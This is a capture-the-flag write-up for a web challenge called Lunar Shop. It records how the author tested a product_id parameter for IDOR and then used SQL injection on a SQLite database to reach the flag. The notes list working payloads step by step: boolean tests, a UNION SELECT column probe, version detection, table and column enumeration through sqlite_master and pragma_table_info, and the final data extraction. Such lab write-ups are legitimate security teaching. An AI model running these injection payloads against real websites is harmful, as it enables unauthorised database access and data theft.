#### Lunar Shop
- points earned: 10 

#### Notes
- clicking on one of the products at `/products` brings you to a url like `https://meteor.sunshinectf.games/product?product_id=1`
- I first manually checked for IDOR by substituting `1` for numbers in the range `1-11`.  No products are returned above 11.
- Before scripting something to go further on the IDOR I checked for SQLI.
- using something like `?product=1'` gives me an error. `[ Error occured. --> unrecognized token: "';" ]`
- Using something like `?product_id=1 or 1=1-- ` returns a single result.
- Using something like `?product_id=1 and 1=0-- ` returns no results.
- Using something like `0 union select 1,2,3,4--` returns a single result with `1`, `2`, `3`, and `4` in the expected places.
- This confirms SQLI and indicates that the page will only show 1 result.

#### Solution
- `?product=0 union select sqlite_version(),2,3,4-- ` returns a version which tells me that this is an sqlite DB.
- `?product=0 union select tbl_name,2,3,4 from sqlite_master where type='table'-- ` returns a single table `flag`.
- `?product=0 union select group_concat(name),2,3,4 from pragma_table_info('flag')-- ` returns 2 column names `id` and `flag`
- `?product=0 union select flag,2,3,4 from flag-- `reveals the flag.